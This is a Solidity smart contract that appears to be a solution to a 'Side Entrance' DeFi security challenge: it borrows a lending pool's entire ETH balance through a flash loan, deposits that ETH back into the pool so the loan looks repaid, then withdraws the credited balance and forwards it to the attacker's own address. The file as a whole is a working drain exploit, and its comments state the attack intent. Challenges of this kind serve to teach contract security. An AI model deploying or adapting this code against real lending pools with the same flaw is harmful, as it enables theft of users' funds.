// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;
    ISideEntranceLenderPool pool;
    address private owner;
    // to share poolBalance among functions
    uint256 private _poolBalance;

    constructor(address _pool) payable {
        pool = ISideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    /**
     * @notice deposit _poolBalance ETH into the pool 
     */
    function execute() external payable {
        pool.deposit{value: _poolBalance}();
    }

    function callFlashLoan() external {
        require(msg.sender == owner, "Only owner");
        // set pool balance
        _poolBalance = address(pool).balance;
        // get flashloan to attack
        pool.flashLoan(_poolBalance);
        // withdraw deposited ETH in `execute()`
        pool.withdraw();
        // sent wihdrawn balance in the previous step to the attacker EOA
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
